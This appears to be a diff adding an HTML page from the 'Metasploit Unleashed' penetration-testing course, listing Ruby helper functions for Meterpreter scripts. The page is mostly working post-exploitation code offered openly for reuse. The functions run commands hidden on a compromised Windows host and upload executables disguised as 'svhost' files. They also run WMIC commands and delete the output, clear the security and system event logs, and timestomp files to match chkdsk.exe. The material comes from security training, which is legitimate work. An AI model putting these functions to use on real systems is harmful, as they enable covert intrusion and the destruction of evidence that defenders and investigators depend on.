@@ -1,0 +1,63 @@
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
+<html>
+<head>
+  <meta content="text/html; charset=ISO-8859-1"
+ http-equiv="Content-Type">
+  <title>Useful Functions</title>
+</head>
+<body>
+<h1 style="color: rgb(0, 0, 0);" id="firstHeading" class="firstHeading">Useful
+Functions</h1>
+<h3 style="color: rgb(0, 0, 0);" id="siteSub">From Metasploit Unleashed
+- Mastering The Framework</h3>
+<p style="color: rgb(0, 0, 0);">Let's look at a few other functions
+which could be useful in building a Meterpreter script. Feel free to
+reuse these as needed.
+</p>
+<p style="color: rgb(0, 0, 0);">Function for executing a list of
+commands or a single command and returns the output:
+<br>
+<br>
+</p>
+<pre style="color: rgb(0, 0, 0);">#-------------------------------------------------------------------------------<br><br>def list_exec(session,cmdlst)<br>    if cmdlst.kind_of? String<br>        cmdlst = cmdlst.to_a<br>    end<br>    print_status("Running Command List ...")<br>    r=''<br>    session.response_timeout=120<br>    cmdlst.each do |cmd|<br>        begin<br>            print_status "trunning command #{cmd}"<br>            r = session.sys.process.execute(cmd, nil, {'Hidden' =&gt; true, 'Channelized' =&gt; true})<br>            while(d = r.channel.read)<br><br>                print_status("t#{d}")<br>            end<br>            r.channel.close<br>            r.close<br>        rescue ::Exception =&gt; e<br>            print_error("Error Running Command #{cmd}: #{e.class} #{e}")<br>        end<br>    end<br>end</pre>
+<br style="color: rgb(0, 0, 0);">
+<span style="color: rgb(0, 0, 0);">Function for Checking for UAC:
+</span><br style="color: rgb(0, 0, 0);">
+<br style="color: rgb(0, 0, 0);">
+<pre style="color: rgb(0, 0, 0);">#-------------------------------------------------------------------------------<br><br>def checkuac(session)<br>    uac = false<br>    begin<br>        winversion = session.sys.config.sysinfo<br>        if winversion['OS']=~ /Windows Vista/ or  winversion['OS']=~ /Windows 7/<br>            print_status("Checking if UAC is enaled ...")<br>            key = 'HKLMSOFTWAREMicrosoftWindowsCurrentVersionPoliciesSystem'<br>            root_key, base_key = session.sys.registry.splitkey(key)<br>            value = "EnableLUA"<br>            open_key = session.sys.registry.open_key(root_key, base_key, KEY_READ)<br>            v = open_key.query_value(value)<br>            if v.data == 1<br>                uac = true<br>            else<br>                uac = false<br>            end<br>            open_key.close_key(key)<br>        end<br>    rescue ::Exception =&gt; e<br>        print_status("Error Checking UAC: #{e.class} #{e}")<br>    end<br>    return uac<br>end</pre>
+<br style="color: rgb(0, 0, 0);">
+<span style="color: rgb(0, 0, 0);">Function for uploading files and
+executables
+</span><br style="color: rgb(0, 0, 0);">
+<br style="color: rgb(0, 0, 0);">
+<pre style="color: rgb(0, 0, 0);">#-------------------------------------------------------------------------------<br><br>def upload(session,file,trgloc = nil)<br>    if not ::File.exists?(file)<br>            raise "File to Upload does not exists!"<br>        else<br>        if trgloc == nil<br>        location = session.fs.file.expand_path("%TEMP%")<br>        else<br>            location = trgloc<br>        end<br>        begin<br>            if file =~ /S*(.exe)/i<br>                       fileontrgt = "#{location}svhost#{rand(100)}.exe"<br>            else<br>                    fileontrgt = "#{location}TMP#{rand(100)}"<br>            end<br>            print_status("Uploadingd #{file}....")<br>            session.fs.file.upload_file("#{fileontrgt}","#{file}")<br>            print_status("#{file} uploaded!")<br>            print_status("#{fileontrgt}")<br>        rescue ::Exception =&gt; e<br>            print_status("Error uploading file #{file}: #{e.class} #{e}")<br>        end<br>    end<br>    return fileontrgt<br>end</pre>
+<br style="color: rgb(0, 0, 0);">
+<span style="color: rgb(0, 0, 0);">Function for running a list of WMIC
+commands stored in a array, returns string
+</span><br style="color: rgb(0, 0, 0);">
+<br style="color: rgb(0, 0, 0);">
+<pre style="color: rgb(0, 0, 0);">#-------------------------------------------------------------------------------<br><br>def wmicexec(session,wmiccmds= nil)<br>        windr = ''<br>        tmpout = ''<br>        windrtmp = ""<br>        session.response_timeout=120<br>        begin<br>                tmp = session.fs.file.expand_path("%TEMP%")<br>                wmicfl = tmp + ""+ sprintf("%.5d",rand(100000))<br>                wmiccmds.each do |wmi|<br>                        print_status "running command wmic #{wmi}"<br>                        cmd = "cmd.exe /c %SYSTEMROOT%system32wbemwmic.exe"<br>                        opt = "/append:#{wmicfl} #{wmi}"<br>                        r = session.sys.process.execute( cmd, opt,{'Hidden' =&gt; true})<br>                        sleep(2)<br>                        #Making sure that wmic finnishes before executing next wmic command<br>                        prog2check = "wmic.exe"<br>                        found = 0<br>                        while found == 0<br>                                session.sys.process.get_processes().each do |x|<br>                                        found =1<br>                                        if prog2check == (x['name'].downcase)<br>                                                sleep(0.5)<br>                                                            print_line "."<br>                                                found = 0<br>                                        end<br>                                end<br>                        end<br>                        r.close<br>                end<br>                # Read the output file of the wmic commands<br>                wmioutfile = session.fs.file.new(wmicfl, "rb")<br>                until wmioutfile.eof?<br>                        tmpout &lt;&lt; wmioutfile.read<br>                end<br>                wmioutfile.close<br>        rescue ::Exception =&gt; e<br>                print_status("Error running WMIC commands: #{e.class} #{e}")<br>        end<br>        # We delete the file with the wmic command output.<br>        c = session.sys.process.execute("cmd.exe /c del #{wmicfl}", nil, {'Hidden' =&gt; true})<br>        c.close<br>        tmpout<br>end</pre>
+<br style="color: rgb(0, 0, 0);">
+<span style="color: rgb(0, 0, 0);">Function for writing data to a file:
+</span><br style="color: rgb(0, 0, 0);">
+<br style="color: rgb(0, 0, 0);">
+<pre style="color: rgb(0, 0, 0);">#-----------------------------------------------------<br><br>def filewrt(file2wrt, data2wrt)<br>        output = ::File.open(file2wrt, "a")<br>        data2wrt.each_line do |d|<br>                output.puts(d)<br>        end<br>        output.close<br>end</pre>
+<br style="color: rgb(0, 0, 0);">
+<span style="color: rgb(0, 0, 0);">Function for clearing all event
+logs:
+</span><br style="color: rgb(0, 0, 0);">
+<br style="color: rgb(0, 0, 0);">
+<pre style="color: rgb(0, 0, 0);">#-------------------------------------------------------------------------------<br><br>def clrevtlgs(session)<br>    evtlogs = [<br>        'security',<br>        'system',<br>        'application',<br>        'directory service',<br>        'dns server',<br>        'file replication service'<br>    ]<br>    print_status("Clearing Event Logs, this will leave and event 517")<br>    begin<br>        evtlogs.each do |evl|<br>            print_status("tClearing the #{evl} Event Log")<br>            log = session.sys.eventlog.open(evl)<br>            log.clear<br>        end<br>        print_status("Alll Event Logs have been cleared")<br>    rescue ::Exception =&gt; e<br>        print_status("Error clearing Event Log: #{e.class} #{e}")<br><br>    end<br>end</pre>
+<br style="color: rgb(0, 0, 0);">
+<span style="color: rgb(0, 0, 0);">Function for Changing Access Time,
+Modified Time and Created Time of Files Supplied in an Array:
+</span><br style="color: rgb(0, 0, 0);">
+<br style="color: rgb(0, 0, 0);">
+<pre style="color: rgb(0, 0, 0);">#-------------------------------------------------------------------------------<br><br># The files have to be in %WinDir%System32 folder.<br>def chmace(session,cmds)<br>    windir = ''<br>    windrtmp = ""<br>    print_status("Changing Access Time, Modified Time and Created Time of Files Used")<br>    windir = session.fs.file.expand_path("%WinDir%")<br>    cmds.each do |c|<br>        begin<br>            session.core.use("priv")<br>            filetostomp = windir + "system32"+ c<br>            fl2clone = windir + "system32chkdsk.exe"<br>            print_status("tChanging file MACE attributes on #{filetostomp}")<br>            session.priv.fs.set_file_mace_from_file(filetostomp, fl2clone)<br><br>        rescue ::Exception =&gt; e<br>            print_status("Error changing MACE: #{e.class} #{e}")<br>        end<br>    end<br>end</pre>
+<br style="color: rgb(0, 0, 0);">
+<br style="color: rgb(0, 0, 0);">
+<div style="text-align: center; color: rgb(0, 0, 0);"><a
+ href="http://www.offensive-security.com/metasploit-unleashed/Meterpreter_Scripting"
+ title="Meterpreter Scripting">Meterpreter Scripting</a></div>
+</body>
+</html>
